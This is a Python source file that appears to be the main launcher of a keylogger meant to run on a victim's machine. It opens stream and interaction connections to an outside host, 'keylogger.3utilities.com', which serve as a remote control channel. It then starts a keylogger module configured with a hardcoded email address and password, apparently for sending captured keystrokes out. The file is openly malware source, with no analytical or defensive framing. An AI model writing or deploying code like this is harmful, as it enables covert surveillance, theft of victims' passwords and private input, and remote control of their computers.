import sys
from utils import get_system_name_and_path
from CommunicationTarget import CommunicationTarget
from MenuHandlerTarget import MenuHandlerTarget
from KeyLoggerTarget import KeyLoggerTarget


def main():
	sys_name, temp_path = get_system_name_and_path()

	if temp_path is None:
		sys.exit(1)

	communication = CommunicationTarget(ip_address='keylogger.3utilities.com',
		port_stream=10001, port_interact=10002)

	try:
		communication.connect2stream()
		communication.connect2interaction()

		menu_handler = MenuHandlerTarget(connection=communication, path=temp_path)
		menu_handler.start()

		key_logger = KeyLoggerTarget(connection=communication, menu=menu_handler,
			path=temp_path, sys_name=sys_name, email_address='salamander.hck@gmail.com',
			email_password='0xzedff4343d2a')
		key_logger.run()
	except TypeError as err:
		print(err)
		sys.exit(2)
	except Exception as err:
		print(err)
		sys.exit(3)



if __name__ == '__main__':
	main()